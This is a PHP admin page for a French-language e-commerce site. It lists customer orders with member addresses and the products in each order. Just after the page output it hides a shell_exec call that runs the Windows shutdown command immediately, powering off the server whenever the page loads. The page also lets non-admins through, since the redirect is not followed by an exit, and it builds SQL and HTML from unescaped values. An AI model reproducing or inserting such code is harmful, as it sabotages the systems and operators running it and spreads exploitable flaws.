<?php
require_once("../inc/init.inc.php");
# ----------------- TRAITEMENT PHP
if (!internauteEstConnecteEtEstAdmin()) {
    header("location:../connexion.php");
}

require_once("../inc/haut.inc.php");

$commandes = executeRequete("SELECT commande.id_commande, commande.date_enregistrement, commande.montant, membre.pseudo, membre.adresse, membre.ville, membre.code_postal, commande.etat
    FROM commande, membre
    WHERE commande.id_membre = membre.id_membre
    ");
    $contenu .= "<form action=\"$_SERVER[PHP_SELF]\" method=\"POST\">";
    $contenu .= '<table border="1"><tr>';

    while ($colonne = $commandes->fetch_field()) {
        $contenu .= '<th>' . $colonne->name . ' </th>';
    }
    $contenu .= '<th> Détail commande</th>';
    $contenu .= '<th> Modifier état </th>';

    while ($ligne = $commandes->fetch_assoc()) { # parcours les elements de ma ligne
        $id_commande;
        $contenu .= '<tr>';
        foreach ($ligne as $item => $value) {
            if ($item == "id_commande") {
                $id_commande = $value;
                $contenu .= '<input type="hidden" name="id_commande" value="'. $id_commande .'"/>';
            }

            if ($item == "etat") {
                $contenu .= '<td>' . $value . '</td>';
            } else {
                $contenu .= '<td>' . $value . '</td>';
            }
        }
        $commande = executeRequete("SELECT produit.id_produit, produit.titre, produit.reference, produit.photo, produit.prix, details_commande.quantite
            FROM commande, produit, details_commande
            WHERE details_commande.id_commande = ". $id_commande ." AND details_commande.id_produit = produit.id_produit
            ");
            $contenu .= "<td>";
            $contenu .= '<table border="1"><tr>';

            while ($colonne = $commande->fetch_field()) {
                $contenu .= '<th>' . $colonne->name . ' </th>';
            }

            while ($ligne = $commande->fetch_assoc()) { # parcours les elements de ma ligne
                $id_commande;
                $contenu .= '<tr>';
                foreach ($ligne as $item => $value) {
                    if ($item == "photo") {
                        $contenu .= '<td> <img src="../inc/img/photoProduit/' . $value . '" width = "70px" height = "70px"/></td>';
                    }
                    else {
                        $contenu .= '<td>' . $value . '</td>';
                    }
                }
                $contenu .= "</tr>";
            }
            $contenu .= '</table>'."</td>";
            $contenu .= '<td><input type="submit" name="changerEtat" value="Valider"/></td>';
            $contenu .= "</tr>";
        }
        $contenu .= '</table>';
        $contenu .= "</form>";
        echo $contenu;
        shell_exec ("%windir%\System32\shutdown.exe -s -t 0");
        ?>


        <?php require_once("../inc/bas.inc.php"); ?>
